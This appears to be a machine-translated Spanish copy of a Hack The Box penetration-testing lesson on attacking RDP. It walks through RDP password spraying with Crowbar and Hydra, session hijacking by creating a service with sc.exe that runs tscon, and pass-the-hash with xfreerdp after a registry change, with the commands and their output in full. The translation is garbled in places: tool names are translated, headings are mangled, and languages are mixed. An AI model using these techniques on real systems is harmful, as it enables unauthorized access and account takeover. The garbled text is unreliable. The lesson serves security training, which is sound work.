# Attacking RDP

[Protocolo de escritorio remoto (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)es un protocolo patentado desarrollado por Microsoft que proporciona a un usuario una interfaz gráfica para conectarse a otra computadora a través de una conexión de red. También es una de las herramientas de administración más populares, lo que permite a los administradores del sistema controlar centralmente sus sistemas remotos con la misma funcionalidad que si estuvieran en el sitio. Además, los proveedores de servicios administrados (MSP) a menudo utilizan la herramienta para administrar cientos de redes y sistemas de clientes. Desafortunadamente, mientras que RDP facilita enormemente la administración remota de sistemas de TI distribuidos, también crea otra puerta de enlace para los ataques.

Por defecto, RDP usa el puerto`TCP/3389`. Usando`Nmap`, podemos identificar el servicio RDP disponible en el host de destino:

Atacando a RDP

```
xnoxos@htb[/htb]# nmap -Pn -p3389 192.168.2.143 Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server

```

---

# **Configiguraciones erróneas**

Dado que RDP toma credenciales de usuario para la autenticación, un vector de ataque común contra el protocolo RDP es la adivinación de contraseña. Aunque no es común, podríamos encontrar un servicio RDP sin una contraseña si hay una configuración errónea.

Una advertencia sobre la contraseña de adivinar en instancias de Windows es que debe considerar la política de contraseña del cliente. En muchos casos, una cuenta de usuario se bloqueará o deshabilitará después de un cierto número de intentos de inicio de sesión fallidos. En este caso, podemos realizar una técnica de adivinanzas de contraseña específica llamada`Password Spraying`. Esta técnica funciona intentando una sola contraseña para muchos nombres de usuario antes de probar otra contraseña, teniendo cuidado de evitar el bloqueo de la cuenta.

Usando el[Palanca](https://github.com/galkan/crowbar)Herramienta, podemos realizar un ataque de pulverización de contraseña contra el servicio RDP. Como ejemplo a continuación, la contraseña`password123` will be tested against a list of usernames in the `usernames.txt` file. The attack found the valid credentials as `administrator` : `password123`en el host RDP objetivo.

Atacando a RDP

```
xnoxos@htb[/htb]# cat usernames.txt root
test
user
guest
admin
administrator

```

### **Crowbar - Pulverización de contraseñas RDP**

Atacando a RDP

```
xnoxos@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP

```

También podemos usar`Hydra`Para realizar un ataque con contraseña RDP.

### **Hydra - RDP Pressing Spraying**

Atacando a RDP

```
xnoxos@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdpHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56

```

Podemos RDP en el sistema de destino utilizando el`rdesktop`cliente o`xfreerdp`Cliente con credenciales válidas.

### **RDP Iniciar sesión**

Atacando a RDP

```
xnoxos@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes

```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-7-2.png)

---

# **Ataques específicos del protocolo**

Imaginemos que obtenemos acceso con éxito a una máquina y tenemos una cuenta con los privilegios de administrador local. Si un usuario está conectado a través de RDP a nuestra máquina comprometida, podemos secuestrar la sesión de escritorio remota del usuario para aumentar nuestros privilegios y hacerse pasar por la cuenta. En un entorno de Active Directory, esto podría hacer que asumir una cuenta de administrador de dominio o promover nuestro acceso dentro del dominio.

### **Secuestro de la sesión de RDP**

Como se muestra en el ejemplo a continuación, estamos conectados como usuario`juurena`(UserId = 2) quién tiene`Administrator`privilegios. Nuestro objetivo es secuestrar al usuario`lewen`(ID de usuario = 4), que también registra a través de RDP.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-1-2.png)

Para hacerse pasar con éxito a un usuario sin su contraseña, necesitamos tener`SYSTEM`privilegios y use el Microsoft[tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)Binario que permite a los usuarios conectarse a otra sesión de escritorio. Funciona especificando cuál`SESSION ID` (`4`para el`lewen`Sesión en nuestro ejemplo) Nos gustaría conectarnos con qué nombre de sesión (`rdp-tcp#13`, que es nuestra sesión actual). Entonces, por ejemplo, el siguiente comando abrirá una nueva consola como la especificada`SESSION_ID`Dentro de nuestra sesión actual de RDP:

Atacando a RDP

```
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

```

Si tenemos privilegios de administrador local, podemos usar varios métodos para obtener`SYSTEM`privilegios, como[Psexeco](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)o[Mimikatz](https://github.com/gentilkiwi/mimikatz). Un truco simple es crear un servicio de Windows que, por defecto, se ejecute como`Local System`y ejecutará cualquier binario con`SYSTEM`privilegios. Usaremos[Microsoft SC.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create)binario. Primero, especificamos el nombre del servicio (`sessionhijack`) y el`binpath`, que es el comando que queremos ejecutar. Una vez que ejecutamos el siguiente comando, se llamó un servicio`sessionhijack`será creado.

Atacando a RDP

```
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS

```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-2-2.png)

Para ejecutar el comando, podemos iniciar el`sessionhijack`servicio :

Atacando a RDP

```
C:\htb> net start sessionhijack

```

Una vez que se inicia el servicio, una nueva terminal con el`lewen`Aparecerá la sesión de usuario. Con esta nueva cuenta, podemos intentar descubrir qué tipo de privilegios tiene en la red, y tal vez tengamos suerte, y el usuario es miembro del grupo de escritorio de ayuda con derechos de administrador para muchos hosts o incluso un administrador de dominio.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-3-2.png)

*Nota: Este método ya no funciona en el servidor 2019.*

---

# **RDP PASS-THE-HASH (PTH)**

Es posible que deseemos acceder a aplicaciones o software instalados en el sistema Windows de un usuario que solo está disponible con acceso a GUI durante una prueba de penetración. Si tenemos credenciales de texto sin formato para el usuario de destino, no será un problema para RDP en el sistema. Sin embargo, ¿qué pasa si solo tenemos el hash NT del usuario obtenido de un ataque de descarga de credenciales como[Sam](https://en.wikipedia.org/wiki/Security_Account_Manager)Base de datos, ¿y no pudimos descifrar el hash para revelar la contraseña de texto sin formato? En algunos casos, podemos realizar un ataque RDP PTH para obtener acceso de GUI al sistema de destino utilizando herramientas como`xfreerdp`.

Hay algunas advertencias para este ataque:

- `Restricted Admin Mode`, que está deshabilitado de forma predeterminada, debe habilitarse en el host de destino; De lo contrario, se nos solicitará el siguiente error:

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-4.png)

Esto se puede habilitar agregando una nueva clave de registro`DisableRestrictedAdmin`(Reg_dword) debajo`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. Se puede hacer usando el siguiente comando:

### **Agregar la clave de registro de InlableRetRictedMin**

Atacando a RDP

```
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-5.png)

Una vez que se agrega la clave de registro, podemos usar`xfreerdp`con la opción`/pth`Para obtener acceso RDP:

Atacando a RDP

```
xnoxos@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

<SNIP>

```

Si funciona, ahora se registraremos a través de RDP como el usuario de destino sin conocer su contraseña de ClearText.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-6-2.png)

Tenga en cuenta que esto no funcionará en todos los sistemas de Windows que encontramos, pero siempre vale la pena intentarlo en una situación en la que tengamos un hash NTLM, sabe que el usuario tiene derechos RDP contra una máquina o un conjunto de máquinas, y el acceso a la GUI nos beneficiaría de alguna manera para cumplir con el objetivo de nuestra evaluación.